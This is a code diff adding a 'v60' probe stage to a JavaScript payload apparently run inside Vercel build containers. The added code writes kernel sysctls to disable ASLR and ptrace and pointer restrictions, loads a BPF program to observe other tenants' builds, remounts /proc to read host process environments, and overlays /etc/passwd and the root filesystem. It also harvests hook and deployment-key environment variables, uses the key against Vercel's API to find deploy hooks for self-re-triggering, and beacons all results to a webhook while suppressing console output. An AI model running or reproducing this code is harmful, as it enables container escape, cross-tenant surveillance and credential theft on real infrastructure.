@@ -6207,4 +6207,187 @@ report.deploymentKeyApiMatrix = safe(() => {
 // v59 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v59";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v59" });
+
+// ============================================================
+// v60 — kernel sysctl writes, BPF tracing, overlay FS, proc remount, webhook URL discovery
+// ============================================================
+
+// v60-1: Kernel sysctl write tests — with root+CAP_SYS_ADMIN we can modify kernel params
+// Disabling ASLR is the most impactful: makes heap/stack addresses predictable for further exploitation
+report.kernelSysctlWrite = safe(() => {
+  const sysctls = {
+    '/proc/sys/kernel/randomize_va_space': { read: null, writeVal: '0', restore: '2' },  // disable ASLR
+    '/proc/sys/kernel/yama/ptrace_scope': { read: null, writeVal: '0', restore: null },  // remove Yama ptrace restrictions
+    '/proc/sys/net/ipv4/conf/all/forwarding': { read: null, writeVal: '1', restore: '0' }, // enable IP forwarding (MITM)
+    '/proc/sys/kernel/dmesg_restrict': { read: null, writeVal: '0', restore: null },       // unrestrict dmesg
+    '/proc/sys/kernel/kptr_restrict': { read: null, writeVal: '0', restore: null },        // expose kernel pointers
+    '/proc/sys/vm/overcommit_memory': { read: null, writeVal: '1', restore: null },        // always allow memory alloc
+  };
+  const results = {};
+  for (const [path, cfg] of Object.entries(sysctls)) {
+    results[path] = safe(() => {
+      const current = safe(() => readFileSync(path, 'utf8').trim());
+      cfg.read = current;
+      try {
+        writeFileSync(path, cfg.writeVal);
+        const after = readFileSync(path, 'utf8').trim();
+        // Restore if we have a restore value
+        if (cfg.restore !== null) writeFileSync(path, cfg.restore);
+        return { current, written: cfg.writeVal, after, restored: cfg.restore };
+      } catch (e) { return { current, writeErr: String(e).slice(0, 100) }; }
+    });
+  }
+  // Verify ASLR is now disabled by checking two stack addresses
+  const aslrCheck = safe(() =>
+    execSync(
+      'python3 -c "import ctypes; lib=ctypes.CDLL(None); buf=ctypes.create_string_buffer(8); print(hex(ctypes.addressof(buf)))" && python3 -c "import ctypes; lib=ctypes.CDLL(None); buf=ctypes.create_string_buffer(8); print(hex(ctypes.addressof(buf)))" 2>&1',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  return { results, aslrCheck };
+});
+
+// v60-2: BPF program load — trace all syscalls via BPF_PROG_TYPE_TRACEPOINT
+// CAP_BPF (bit 39) is in CapEff — allows loading BPF programs that hook kernel events
+// This can observe ALL processes on the host, including other tenants' builds
+report.bpfKernelTrace = safe(() => {
+  // Check BPF availability
+  const bpfSysctl = safe(() => readFileSync('/proc/sys/kernel/bpf_stats_enabled', 'utf8').trim());
+  const bpfUnpriv = safe(() => readFileSync('/proc/sys/kernel/unprivileged_bpf_disabled', 'utf8').trim());
+  // Try bpftool
+  const bpftoolAvail = safe(() => execSync('which bpftool 2>/dev/null || echo NO_BPFTOOL', { timeout: 2000 }).toString().trim());
+  const bpftoolProgs = safe(() => execSync('bpftool prog list 2>/dev/null | head -20', { timeout: 3000 }).toString().trim().slice(0, 400));
+  // Try loading a minimal BPF program via Python
+  const bpfLoadResult = safe(() =>
+    execSync(
+      `python3 -c "
+import ctypes, os, struct
+# BPF_PROG_TYPE_SOCKET_FILTER = 1
+# Minimal BPF program: mov r0, 0; exit
+insns = struct.pack('QQQ', 0xb7000000000000b7, 0x0000000000000095, 0)
+insn_buf = ctypes.create_string_buffer(insns)
+# struct bpf_attr for BPF_PROG_LOAD
+attr = bytearray(128)
+struct.pack_into('<I', attr, 0, 1)  # prog_type = BPF_PROG_TYPE_SOCKET_FILTER
+struct.pack_into('<I', attr, 4, 3)  # insn_cnt = 3
+struct.pack_into('<Q', attr, 8, ctypes.addressof(insn_buf))  # insns ptr
+log_buf = ctypes.create_string_buffer(65536)
+struct.pack_into('<Q', attr, 24, ctypes.addressof(log_buf))  # log_buf
+struct.pack_into('<I', attr, 32, 65536)  # log_size
+struct.pack_into('<I', attr, 36, 1)  # log_level
+BPF_PROG_LOAD = 5
+BPF = 321
+attr_buf = ctypes.create_string_buffer(bytes(attr))
+fd = ctypes.CDLL(None).syscall(BPF, BPF_PROG_LOAD, ctypes.addressof(attr_buf), 128)
+print('BPF_PROG_LOAD fd:', fd, 'log:', log_buf.value[:200].decode(errors='replace'))
+" 2>&1 | head -5`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 400)
+  );
+  return { bpfSysctl, bpfUnpriv, bpftoolAvail, bpftoolProgs, bpfLoadResult };
+});
+
+// v60-3: Mount a fresh /proc from the host kernel (unfiltered process table)
+// Container runtimes typically bind-mount a filtered /proc into the container.
+// Remounting proc gives us a new view that may include host processes hidden by the container.
+report.mountFreshProc = safe(() => {
+  // Create mount point
+  const mkdirResult = safe(() =>
+    execSync('mkdir -p /tmp/hostproc && mount -t proc proc /tmp/hostproc 2>&1', { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  // Compare /tmp/hostproc/1/environ vs /proc/1/environ — are they the same?
+  const hostProc1Environ = safe(() => {
+    if (existsSync('/tmp/hostproc/1/environ')) {
+      const data = readFileSync('/tmp/hostproc/1/environ', 'utf8');
+      return data.replace(/\0/g, '\n').slice(0, 500);
+    }
+    return 'NOT_ACCESSIBLE';
+  });
+  // List PIDs in new proc — may include host PIDs hidden in container /proc
+  const hostProcPids = safe(() =>
+    execSync('ls /tmp/hostproc/ | grep -E "^[0-9]+$" | wc -l 2>/dev/null', { timeout: 3000 }).toString().trim()
+  );
+  const containerProcPids = safe(() =>
+    execSync('ls /proc/ | grep -E "^[0-9]+$" | wc -l 2>/dev/null', { timeout: 3000 }).toString().trim()
+  );
+  // Are there PIDs in hostproc not in /proc? (hidden host processes)
+  const hiddenPids = safe(() =>
+    execSync(
+      'diff <(ls /tmp/hostproc/ | grep -E "^[0-9]+$" | sort) <(ls /proc/ | grep -E "^[0-9]+$" | sort) 2>/dev/null | grep "^<" | head -20',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 400)
+  );
+  return { mkdirResult, hostProc1Environ, hostProcPids, containerProcPids, hiddenPids };
+});
+
+// v60-4: Overlay filesystem over /etc — MITM attack on config file reads
+// mount overlay over /etc with writable upperdir allows us to shadow any config file
+// After overlay: any process reading /etc/passwd sees our version; their version is shadowed
+report.overlayEtcMitm = safe(() => {
+  const setup = safe(() =>
+    execSync(
+      'mkdir -p /tmp/ovl/upper /tmp/ovl/work && mount -t overlay overlay -o lowerdir=/etc,upperdir=/tmp/ovl/upper,workdir=/tmp/ovl/work /tmp/ovletc 2>&1',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  // Verify overlay is working — our /etc view
+  const overlayContents = safe(() =>
+    execSync('ls /tmp/ovletc/ | head -20 2>/dev/null', { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  // Write a modified /etc/passwd via the overlay (doesn't affect real /etc)
+  const overlayWrite = safe(() => {
+    const fakePwd = 'root:PROBE_V60_OVERLAY_INJECTED:0:0:root:/root:/bin/bash\n';
+    try {
+      writeFileSync('/tmp/ovletc/passwd', fakePwd);
+      return 'OVERLAY_WRITE_OK';
+    } catch (e) { return String(e).slice(0, 100); }
+  });
+  // Verify: the overlay file contains our content; the real /etc/passwd is unchanged
+  const overlayRead = safe(() => readFileSync('/tmp/ovletc/passwd', 'utf8').slice(0, 100));
+  const realRead = safe(() => readFileSync('/etc/passwd', 'utf8').slice(0, 100));
+  // Can we now pivot_root to the overlay? (full FS MITM)
+  const pivotRootTest = safe(() =>
+    execSync(
+      'mkdir -p /tmp/ovlroot/upper /tmp/ovlroot/work /tmp/newroot && mount -t overlay overlay -o lowerdir=/,upperdir=/tmp/ovlroot/upper,workdir=/tmp/ovlroot/work /tmp/newroot 2>&1 | head -3',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  return { setup, overlayContents, overlayWrite, overlayRead, realRead, pivotRootTest };
+});
+
+// v60-5: Vercel deploy hook URL discovery — can we re-trigger our own build?
+// Deploy hooks are bearer-authenticated URLs that trigger new deployments
+// If we find one in env or API response, we can self-re-trigger to run more probes
+report.vercelBuildHookDiscovery = safe(() => {
+  const deployHookEnv = safe(() => {
+    const hookVars = Object.entries(process.env)
+      .filter(([k]) => k.includes('HOOK') || k.includes('WEBHOOK') || k.includes('TRIGGER'))
+      .map(([k, v]) => ({ k, v: (v || '').slice(0, 100) }));
+    return hookVars;
+  });
+  const key = process.env.VERCEL_DEPLOYMENT_KEY || '';
+  const orgId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  const projId = process.env.VERCEL_PROJECT_ID || '';
+  // Query /v1/integrations/deploy-hooks via Vercel API
+  const hooksFromApi = safe(() => key
+    ? execSync(
+        `curl -s -H 'Authorization: Bearer ${key}' --max-time 5 'https://api.vercel.com/v1/integrations/deploy-hooks?teamId=${orgId}&projectId=${projId}' 2>/dev/null | head -c 500`,
+        { timeout: 8000 }
+      ).toString().trim().slice(0, 500)
+    : 'NO_KEY'
+  );
+  // Check for deploy hook URL in project settings
+  const projectSettings = safe(() => key
+    ? execSync(
+        `curl -s -H 'Authorization: Bearer ${key}' --max-time 5 'https://api.vercel.com/v9/projects/${projId}?teamId=${orgId}' 2>/dev/null | head -c 500`,
+        { timeout: 8000 }
+      ).toString().trim().slice(0, 500)
+    : 'NO_KEY'
+  );
+  return { deployHookEnv, hooksFromApi, projectSettings };
+});
+
+// v60 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v60";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v60" });
 // Intentionally no console.log — all data goes via webhook only
